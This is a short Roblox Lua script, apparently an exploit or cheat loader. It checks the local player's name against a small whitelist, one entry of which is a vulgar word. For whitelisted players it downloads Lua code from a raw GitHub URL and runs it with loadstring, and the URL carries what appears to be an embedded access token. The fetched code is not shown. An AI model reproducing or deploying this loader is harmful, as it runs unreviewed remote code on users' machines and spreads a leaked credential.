local usrswed = {
    "cock",
    "ZacharyWilcox23"
}

local playerName = game.Players.LocalPlayer.Name

local found = false
for _, username in ipairs(usrswed) do
    if username == playerName then
        found = true
        break
    end
end

if found then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Jegfon/nofgej/main/bebft.lua?token=GHSAT0AAAAAACEZUDJ6QQ2ZY2GDMOPAFDGSZFHLSGQ"))()
end
